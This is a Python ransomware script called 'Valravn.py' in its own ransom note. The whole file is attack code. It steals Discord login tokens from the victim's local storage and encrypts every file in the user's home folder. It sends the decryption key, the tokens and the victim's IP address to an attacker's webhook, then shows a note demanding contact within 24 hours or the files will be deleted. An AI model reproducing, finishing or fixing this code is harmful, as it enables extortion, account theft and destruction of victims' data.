import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
import time
import threading
from pathlib import Path

user = str(os.environ["USERNAME"])
path1 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"
path2 = "C:\\Users\\" + user +"\\\\AppData\\\\Roaming\\\\discordcanary\\\\Local Storage\\\\leveldb"
path3 = "C:\\Users\\" + user + "\\\\AppData\\\\Roaming\\\\discordptb\\\\Local Storage\\\\leveldb"
key = Fernet.generate_key()

def find_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

path1_isdir = os.path.isdir(path1)
path2_isdir = os.path.isdir(path2)
path3_isdir = os.path.isdir(path3)

if path1_isdir:
    tokens1 = [find_tokens(path1)]

if path2_isdir:
    tokens2 = [find_tokens(path2)]

if path1_isdir:
    tokens3 = [find_tokens(path3)]

def timer():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    print("timer started")
    time.sleep(86400)
    for file in my_path.glob("**/*.*"):
        os.system("del " + file + " /s /f /q")

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "yourname" #change to your discord name and tag
    ip = requests.get('https://api.ipify.org').text
    url = "webhook" # webhook url 
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord tokens: " + " Stable client: " + tokens1 + " Canary: " + tokens2 + " PTB: " + tokens3
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("ransom.txt", "w")
    f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back! You have 24 hours to contact me, after that, all your files will be deleted")
    f.close()
    subprocess.call(r"notepad ransom.txt", shell=False)

def main():
    path1 = "C:\\\\Users\\\\" + user 
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypt(file)
    warn()

main()
